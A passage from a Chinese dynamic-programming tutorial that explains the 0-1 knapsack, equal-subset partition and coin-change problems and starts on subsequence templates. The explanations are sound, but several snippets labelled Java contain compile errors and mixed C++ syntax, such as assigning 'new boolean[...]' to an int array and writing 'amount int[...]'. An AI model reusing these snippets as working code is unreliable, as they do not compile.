开始的，所以对val和wt的取值是i-1。</p><p>而$dp[i-1][w-wt[i-1]]$也很好理解：你如果想装第i个物品，你怎么计算这时候的最大价值？<strong>换句话说，在装第</strong>i个物品的前提下，背包能装的最大价值是多少？</p><p>显然，你应该寻求剩余重量w-wt[i-1]限制下能装的最大价值，加上第i个物品的价值val[i-1]，这就是装第i个物品的前提下，背包可以装的最大价值。</p><p>综上就是两种选择，我们都已经分析完毕，也就是写出来了状态转移方程，可以进一步细化代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> i in [<span class="hljs-number">1.</span>.N]:<br>  <span class="hljs-keyword">for</span> w in [<span class="hljs-number">1.</span>.W]:<br>     dp[i][w] = max(<br>         <span class="hljs-comment">//不装</span><br>       dp[i-<span class="hljs-number">1</span>][w],<br>         <span class="hljs-comment">//装的话减去重量加上价值</span><br>dp[i-<span class="hljs-number">1</span>][w - wt[i-<span class="hljs-number">1</span>]] + val[i-<span class="hljs-number">1</span>]<br>    )<br><span class="hljs-keyword">return</span> dp[N][W]<br></code></pre></td></tr></table></figure><p><strong>最后一步，把伪码翻译成代码，处理一些边界情况</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">knapsack</span><span class="hljs-params">(<span class="hljs-keyword">int</span> W, <span class="hljs-keyword">int</span> N, <span class="hljs-keyword">int</span>[] wt, <span class="hljs-keyword">int</span>[] val)</span> </span>&#123;<br>    <span class="hljs-comment">// dp 全填入 0，base case 已初始化</span><br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[N + <span class="hljs-number">1</span>][W + <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= N; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> w = <span class="hljs-number">1</span>; w &lt;= W; w++) &#123;<br>            <span class="hljs-keyword">if</span> (w - wt[i-<span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// 当前背包容量装不下，只能选择不装入背包</span><br>                dp[i][w] = dp[i - <span class="hljs-number">1</span>][w];<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 装入或者不装入背包，择优</span><br>                dp[i][w] = max(dp[i - <span class="hljs-number">1</span>][w - wt[i-<span class="hljs-number">1</span>]] + val[i-<span class="hljs-number">1</span>], <br>                               dp[i - <span class="hljs-number">1</span>][w]);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> dp[N][W];<br>&#125;<br></code></pre></td></tr></table></figure><p>现在你看这个解法代码，是不是感觉非常简单，就是把我们刚才分析的思路原封不动翻译了一下而已。</p><p>所以说，明确了动态规划的套路，思路就显得行云流水，非常自然就出答案了。</p><p>至此，背包问题就解决了。相比而言，我觉得这是比较简单的动态规划问题，因为状态转移的推导逻辑比较容易想到，基本上你明确了dp数组的定义，就可以理所当然地确定状态转移了。</p><h2 id="5-2-子集背包问题"><a href="#5-2-子集背包问题" class="headerlink" title="5.2 子集背包问题"></a>5.2 子集背包问题</h2><p>上篇文章 <a href="">经典动态规划：0-1 背包问题</a> 详解了通用的 0-1 背包问题，今天来看看背包问题的思想能够如何运用到其他算法题目。</p><p>而且，不是经常有读者问，怎么将二维动态规划压缩成一维动态规划吗？这就是状态压缩，很容易的，本文也会提及这种技巧。</p><p><strong>读者在阅读本文之前务必读懂前文</strong> <a href=""><strong>经典动态规划：0-1 背包问题</strong></a> <strong>中讲的套路，因为本文就是按照背包问题的解题模板来讲解的</strong>。</p><p><strong>1. 问题分析</strong></p><p>先看一下题目：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/title.jpg" alt="title" style="zoom: 33%;" /></p><p>算法的函数签名如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 输入一个集合，返回是否能够分割成和相等的两个子集</span><br><span class="hljs-function">bool <span class="hljs-title">canPartition</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span></span>;<br></code></pre></td></tr></table></figure><p>对于这个问题，看起来和背包没有任何关系，为什么说它是背包问题呢？</p><p>首先回忆一下背包问题大致的描述是什么：</p><p>给你一个可装载重量为 <code>W</code> 的背包和 <code>N</code> 个物品，每个物品有重量和价值两个属性。其中第 <code>i</code> 个物品的重量为 <code>wt[i]</code>，价值为 <code>val[i]</code>，现在让你用这个背包装物品，最多能装的价值是多少？</p><p>那么对于这个问题，我们可以先对集合求和，得出 <code>sum</code>，把问题转化为背包问题：</p><p><strong>给一个可装载重量为</strong> <strong><code>sum / 2</code></strong> <strong>的背包和</strong> <strong><code>N</code></strong> <strong>个物品，每个物品的重量为</strong> <strong><code>nums[i]</code></strong>。现在让你装物品，是否存在一种装法，能够恰好将背包装满？</p><p>你看，这就是背包问题的模型，甚至比我们之前的经典背包问题还要简单一些，<strong>下面我们就直接转换成背包问题</strong>，开始套前文讲过的背包问题框架即可。</p><p><strong>2. 解法分析</strong></p><p><strong>第一步要明确两点，「状态」和「选择」</strong>。</p><p>这个前文 <a href="">经典动态规划：背包问题</a> 已经详细解释过了，状态就是「背包的容量」和「可选择的物品」，选择就是「装进背包」或者「不装进背包」。</p><p><strong>第二步要明确</strong> <strong><code>dp</code></strong> <strong>数组的定义</strong>。</p><p>按照背包问题的套路，可以给出如下定义：</p><p><code>dp[i][j] = x</code> 表示，对于前 <code>i</code> 个物品，当前背包的容量为 <code>j</code> 时，若 <code>x</code> 为 <code>true</code>，则说明可以恰好将背包装满，若 <code>x</code> 为 <code>false</code>，则说明不能恰好将背包装满。</p><p>比如说，如果 <code>dp[4][9] = true</code>，其含义为：对于容量为 9 的背包，若只是用前 4 个物品，可以有一种方法把背包恰好装满。</p><p>或者说对于本题，含义是对于给定的集合中，若只对前 4 个数字进行选择，存在一个子集的和可以恰好凑出 9。</p><p>根据这个定义，我们想求的最终答案就是 <code>dp[N][sum/2]</code>，base case 就是 <code>dp[..][0] = true</code> 和 <code>dp[0][..] = false</code>，因为背包没有空间的时候，就相当于装满了，而当没有物品可选择的时候，肯定没办法装满背包。</p><p><strong>第三步，根据「选择」，思考状态转移的逻辑</strong>。</p><p>回想刚才的 <code>dp</code> 数组含义，可以根据「选择」对 <code>dp[i][j]</code> 得到以下状态转移：</p><p>如果不把 <code>nums[i]</code> 算入子集，<strong>或者说你不把这第</strong> <strong><code>i</code></strong> <strong>个物品装入背包</strong>，那么是否能够恰好装满背包，取决于上一个状态 <code>dp[i-1][j]</code>，继承之前的结果。</p><p>如果把 <code>nums[i]</code> 算入子集，<strong>或者说你把这第</strong> <strong><code>i</code></strong> <strong>个物品装入了背包</strong>，那么是否能够恰好装满背包，取决于状态 <code>dp[i-1][j-nums[i-1]]</code>。</p><p>首先，由于 <code>i</code> 是从 1 开始的，而数组索引是从 0 开始的，所以第 <code>i</code> 个物品的重量应该是 <code>nums[i-1]</code>，这一点不要搞混。</p><p><code>dp[i - 1][j-nums[i-1]]</code> 也很好理解：你如果装了第 <code>i</code> 个物品，就要看背包的剩余重量 <code>j - nums[i-1]</code> 限制下是否能够被恰好装满。</p><p>换句话说，如果 <code>j - nums[i-1]</code> 的重量可以被恰好装满，那么只要把第 <code>i</code> 个物品装进去，也可恰好装满 <code>j</code> 的重量；否则的话，重量 <code>j</code> 肯定是装不满的。</p><p><strong>最后一步，把伪码翻译成代码，处理一些边界情况</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function">bool <span class="hljs-title">canPartition</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> num : nums) sum += num;<br>    <span class="hljs-comment">// 和为奇数时，不可能划分成两个和相等的集合</span><br>    <span class="hljs-keyword">if</span> (sum % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    <span class="hljs-keyword">int</span> n = nums.length();<br>    sum = sum / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[n + <span class="hljs-number">1</span>][sum + <span class="hljs-number">1</span>];<br>    Arrays.fill(dp,<span class="hljs-keyword">false</span>);<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= n; i++)<br>        dp[i][<span class="hljs-number">0</span>] = <span class="hljs-keyword">true</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= sum; j++) &#123;<br>            <span class="hljs-keyword">if</span> (j - nums[i - <span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span>) &#123;<br>               <span class="hljs-comment">// 背包容量不足，不能装入第 i 个物品</span><br>                dp[i][j] = dp[i - <span class="hljs-number">1</span>][j]; <br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 装入或不装入背包</span><br>                dp[i][j] = dp[i - <span class="hljs-number">1</span>][j] || dp[i - <span class="hljs-number">1</span>][j-nums[i-<span class="hljs-number">1</span>]];<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[n][sum];<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>3. 进行状态压缩</strong></p><p>再进一步，是否可以优化这个代码呢？<strong>注意到</strong> <strong><code>dp[i][j]</code></strong> <strong>都是通过上一行</strong> <strong><code>dp[i-1][..]</code></strong> <strong>转移过来的</strong>，之前的数据都不会再使用了。</p><p>所以，我们可以进行状态压缩，将二维 <code>dp</code> 数组压缩为一维，节约空间复杂度：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function">bool <span class="hljs-title">canPartition</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>, n = nums.size();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> num : nums) sum += num;<br>    <span class="hljs-keyword">if</span> (sum % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    sum = sum / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[sum + <span class="hljs-number">1</span>];<br>    Arrays.fill(dp,<span class="hljs-keyword">false</span>);<br>    <span class="hljs-comment">// base case</span><br>    dp[<span class="hljs-number">0</span>] = <span class="hljs-keyword">true</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) <br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = sum; j &gt;= <span class="hljs-number">0</span>; j--) <br>            <span class="hljs-keyword">if</span> (j - nums[i] &gt;= <span class="hljs-number">0</span>) <br>                dp[j] = dp[j] || dp[j - nums[i]];<br><br>    <span class="hljs-keyword">return</span> dp[sum];<br>&#125;<br></code></pre></td></tr></table></figure><p>这就是状态压缩，其实这段代码和之前的解法思路完全相同，只在一行 <code>dp</code> 数组上操作，<code>i</code> 每进行一轮迭代，<code>dp[j]</code> 其实就相当于 <code>dp[i-1][j]</code>，所以只需要一维数组就够用了。</p><p><strong>唯一需要注意的是</strong> <strong><code>j</code></strong> 应该从后往前反向遍历，因为每个物品（或者说数字）只能用一次，以免之前的结果影响其他的结果。</p><p>至此，子集切割的问题就完全解决了，时间复杂度 O(n*sum)，空间复杂度 O(sum)。</p><h2 id="5-3-完全背包问题"><a href="#5-3-完全背包问题" class="headerlink" title="5.3 完全背包问题"></a>5.3 完全背包问题</h2><p>零钱兑换 2 是另一种典型背包问题的变体，我们前文已经讲了 <a href="">经典动态规划：0-1 背包问题</a> 和 <a href="">背包问题变体：相等子集分割</a>。</p><p><strong>读本文之前，希望你已经看过前两篇文章</strong>，看过了动态规划和背包问题的套路，这篇继续按照背包问题的套路，列举一个背包问题的变形。</p><p>本文聊的是 LeetCode 第 518 题 Coin Change 2，题目如下：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/零钱兑换2" alt="img" style="zoom: 33%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-keyword">int</span> amount, <span class="hljs-keyword">int</span>[] coins)</span></span>;<br></code></pre></td></tr></table></figure><p>PS：至于 Coin Change 1，在我们前文 <a href="">动态规划套路详解</a> 写过。</p><p><strong>我们可以把这个问题转化为背包问题的描述形式</strong>：</p><p>有一个背包，最大容量为 <code>amount</code>，有一系列物品 <code>coins</code>，每个物品的重量为 <code>coins[i]</code>，<strong>每个物品的数量无限</strong>。请问有多少种方法，能够把背包恰好装满？</p><p>这个问题和我们前面讲过的两个背包问题，有一个最大的区别就是，每个物品的数量是无限的，这也就是传说中的「<strong>完全背包问题</strong>」，没啥高大上的，无非就是状态转移方程有一点变化而已。</p><p>下面就以背包问题的描述形式，继续按照流程来分析。</p><p><strong>解题思路</strong></p><p><strong>第一步要明确两点，「状态」和「选择」</strong>。</p><p>状态有两个，就是「背包的容量」和「可选择的物品」，选择就是「装进背包」或者「不装进背包」嘛，背包问题的套路都是这样。</p><p>明白了状态和选择，动态规划问题基本上就解决了，只要往这个框架套就完事儿了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> 状态<span class="hljs-number">1</span> in 状态<span class="hljs-number">1</span>的所有取值：<br>    <span class="hljs-keyword">for</span> 状态<span class="hljs-number">2</span> in 状态<span class="hljs-number">2</span>的所有取值：<br>        <span class="hljs-keyword">for</span> ...<br>            dp[状态<span class="hljs-number">1</span>][状态<span class="hljs-number">2</span>][...] = 计算(选择<span class="hljs-number">1</span>，选择<span class="hljs-number">2.</span>..)<br></code></pre></td></tr></table></figure><p><strong>第二步要明确</strong> <strong><code>dp</code></strong> <strong>数组的定义</strong>。</p><p>首先看看刚才找到的「状态」，有两个，也就是说我们需要一个二维 <code>dp</code> 数组。</p><p><code>dp[i][j]</code> 的定义如下：</p><p>若只使用前 <code>i</code> 个物品，当背包容量为 <code>j</code> 时，有 <code>dp[i][j]</code> 种方法可以装满背包。</p><p>换句话说，翻译回我们题目的意思就是：</p><p><strong>若只使用</strong> <strong><code>coins</code></strong> <strong>中的前</strong> <strong><code>i</code></strong> <strong>个硬币的面值，若想凑出金额</strong> <strong><code>j</code></strong>，有 <strong><code>dp[i][j]</code></strong> <strong>种凑法</strong>。</p><p>经过以上的定义，可以得到：</p><p>base case 为 <code>dp[0][..] = 0， dp[..][0] = 1</code>。因为如果不使用任何硬币面值，就无法凑出任何金额；如果凑出的目标金额为 0，那么“无为而治”就是唯一的一种凑法。</p><p>我们最终想得到的答案就是 <code>dp[N][amount]</code>，其中 <code>N</code> 为 <code>coins</code> 数组的大小。</p><p>大致的伪码思路如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> dp[N+<span class="hljs-number">1</span>][amount+<span class="hljs-number">1</span>]<br>dp[<span class="hljs-number">0</span>][..] = <span class="hljs-number">0</span><br>dp[..][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span><br><br><span class="hljs-keyword">for</span> i in [<span class="hljs-number">1.</span>.N]:<br>    <span class="hljs-keyword">for</span> j in [<span class="hljs-number">1.</span>.amount]:<br>        把物品 i 装进背包,<br>        不把物品 i 装进背包<br><span class="hljs-keyword">return</span> dp[N][amount]<br></code></pre></td></tr></table></figure><p><strong>第三步，根据「选择」，思考状态转移的逻辑</strong>。</p><p>注意，我们这个问题的特殊点在于物品的数量是无限的，所以这里和之前写的背包问题文章有所不同。</p><p><strong>如果你不把这第</strong> <strong><code>i</code></strong> <strong>个物品装入背包</strong>，也就是说你不使用 <code>coins[i]</code> 这个面值的硬币，那么凑出面额 <code>j</code> 的方法数 <code>dp[i][j]</code> 应该等于 <code>dp[i-1][j]</code>，继承之前的结果。</p><p><strong>如果你把这第</strong> <strong><code>i</code></strong> <strong>个物品装入了背包</strong>，也就是说你使用 <code>coins[i]</code> 这个面值的硬币，那么 <code>dp[i][j]</code> 应该等于 <code>dp[i][j-coins[i-1]]</code>。</p><p>首先由于 <code>i</code> 是从 1 开始的，所以 <code>coins</code> 的索引是 <code>i-1</code> 时表示第 <code>i</code> 个硬币的面值。</p><p><code>dp[i][j-coins[i-1]]</code> 也不难理解，如果你决定使用这个面值的硬币，那么就应该关注如何凑出金额 <code>j - coins[i-1]</code>。</p><p>比如说，你想用面值为 2 的硬币凑出金额 5，那么如果你知道了凑出金额 3 的方法，再加上一枚面额为 2 的硬币，不就可以凑出 5 了嘛。</p><p><strong>综上就是两种选择，而我们想求的</strong> <strong><code>dp[i][j]</code></strong> <strong>是「共有多少种凑法」，所以</strong> <strong><code>dp[i][j]</code></strong> <strong>的值应该是以上两种选择的结果之和</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= amount; j++) &#123;<br>        <span class="hljs-keyword">if</span> (j - coins[i-<span class="hljs-number">1</span>] &gt;= <span class="hljs-number">0</span>)<br>            dp[i][j] = dp[i - <span class="hljs-number">1</span>][j] <br>                     + dp[i][j-coins[i-<span class="hljs-number">1</span>]];<br><span class="hljs-keyword">return</span> dp[N][W]<br></code></pre></td></tr></table></figure><p><strong>最后一步，把伪码翻译成代码，处理一些边界情况</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-keyword">int</span> amount, <span class="hljs-keyword">int</span>[] coins)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = coins.length;<br>    <span class="hljs-keyword">int</span>[][] dp = amount <span class="hljs-keyword">int</span>[n + <span class="hljs-number">1</span>][amount + <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= n; i++) <br>        dp[i][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= amount; j++)<br>            <span class="hljs-keyword">if</span> (j - coins[i-<span class="hljs-number">1</span>] &gt;= <span class="hljs-number">0</span>)<br>                dp[i][j] = dp[i - <span class="hljs-number">1</span>][j] <br>                         + dp[i][j - coins[i-<span class="hljs-number">1</span>]];<br>            <span class="hljs-keyword">else</span> <br>                dp[i][j] = dp[i - <span class="hljs-number">1</span>][j];<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[n][amount];<br>&#125;<br></code></pre></td></tr></table></figure><p>而且，我们通过观察可以发现，<code>dp</code> 数组的转移只和 <code>dp[i][..]</code> 和 <code>dp[i-1][..]</code> 有关，所以可以压缩状态，进一步降低算法的空间复杂度：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-keyword">int</span> amount, <span class="hljs-keyword">int</span>[] coins)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = coins.length;<br>    <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[amount + <span class="hljs-number">1</span>];<br>    dp[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>; <span class="hljs-comment">// base case</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= amount; j++)<br>            <span class="hljs-keyword">if</span> (j - coins[i] &gt;= <span class="hljs-number">0</span>)<br>                dp[j] = dp[j] + dp[j-coins[i]];<br><br>    <span class="hljs-keyword">return</span> dp[amount];<br>&#125;<br></code></pre></td></tr></table></figure><p>这个解法和之前的思路完全相同，将二维 <code>dp</code> 数组压缩为一维，时间复杂度 O(N*amount)，空间复杂度 O(amount)。</p><p>至此，这道零钱兑换问题也通过背包问题的框架解决了。</p><h1 id="6-子序列问题"><a href="#6-子序列问题" class="headerlink" title="6. 子序列问题"></a>6. 子序列问题</h1><h2 id="6-1-子序列问题解题模板"><a href="#6-1-子序列问题解题模板" class="headerlink" title="6.1 子序列问题解题模板"></a>6.1 子序列问题解题模板</h2><p>子序列问题是常见的算法问题，而且并不好解决。</p><p>首先，子序列问题本身就相对子串、子数组更困难一些，因为前者是不连续的序列，而后两者是连续的，就算穷举都不容易，更别说求解相关的算法问题了。</p><p>而且，子序列问题很可能涉及到两个字符串，比如让你求两个字符串的 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484486&amp;idx=1&amp;sn=0bdcb94c6390307ea32427757ec0072c&amp;chksm=9bd7fa4eaca073583623cdb93b05dc9e1d0757b25697bb40b29b3e450124e929ff1a8eaac50f&amp;scene=21#wechat_redirect">最长公共子序列</a>，如果没有一定的处理经验，真的不容易想出来。所以本文就来扒一扒子序列问题的套路，<strong>其实就有两种模板，相关问题只要往这两种思路上想，十拿九稳。</strong></p><p>一般来说，这类问题都是让你求一个<strong>最长</strong>子序列，因为最短子序列就是一个字符嘛，没啥可问的。一旦涉及到子序列和最值，那几乎可以肯定，<strong>考察的是动态规划技巧，时间复杂度一般都是 O(n^2)</strong>。</p><p>原因很简单，你想想一个字符串，它的子序列有多少种可能？起码是指数级的吧，这种情况下，不用动态规划技巧，还想怎么着呢？</p><p>既然要用动态规划，那就要定义 dp 数组，找状态转移关系。我们说的两种思路模板，就是 dp 数组的定义思路。不同的问题可能需要不同的 dp 数组定义来解决。</p><p><strong>一、两种思路</strong></p><p><strong>1、</strong>第一种思路模板是一个一维的 dp 数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> n = array.length;<br><span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++) &#123;<br>        dp[i] = 最值(dp[i], dp[j] + ...)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>举个我们写过的例子 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484498&amp;idx=1&amp;sn=df58ef249c457dd50ea632f7c2e6e761&amp;chksm=9bd7fa5aaca0734c29bcf7979146359f63f521e3060c2acbf57a4992c887aeebe2a9e4bd8a89&amp;scene=21#wechat_redirect">最长递增子序列</a>，在这个思路中 dp 数组的定义是：</p><p><strong>在子数组array[0..i]</strong>中，以array[i]结尾的目标子序列（最长递增子序列）的长度是dp[i]。</p><p>为啥最长递增子序列需要这种思路呢？前文说得很清楚了，因为这样符合归纳法，可以找到状态转移的关系，这里就不具体展开了。</p><p><strong>2、</strong>第二种思路模板是一个二维的 dp 数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> n = arr.length;<br><span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> dp[n][n];<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt; n; j++) &#123;<br>        <span class="hljs-keyword">if</span> (arr[i] == arr[j]) <br>            dp[i][j] = dp[i][j] + ...<br>        <span class="hljs-keyword">else</span><br>            dp[i][j] = 最值(...)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这种思路运用相对更多一些，尤其是涉及两个字符串/数组的子序列。本思路中 dp 数组含义又分为「只涉及一个字符串」和「涉及两个字符串」两种情况。</p><p><strong>2.1</strong> <strong>涉及两个字符串/数组时</strong>（比如最长公共子序列），dp 数组的含义如下：</p><p><strong>在子数组</strong>arr1[0..i]和子数组arr2[0..j]中，我们要求的子序列（最长公共子序列）长度为$dp[i][j]$。</p><p><strong>2.2</strong> <strong>只涉及一个字符串/数组时</strong>（比如本文要讲的最长回文子序列），dp 数组的含义如下：</p><p><strong>在子数组</strong>array[i..j]中，我们要求的子序列（最长回文子序列）的长度为$dp[i][j]$。</p><p>第一种情况可以参考这两篇旧文：<a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484484&amp;idx=1&amp;sn=74594297022c84952162a68b7f739133&amp;chksm=9bd7fa4caca0735a1364dd13901311ecd6ec4913c8db05a1ff6cae8f069627eebe8d651bbeb1&amp;scene=21#wechat_redirect">详解编辑距离</a> 和 <a 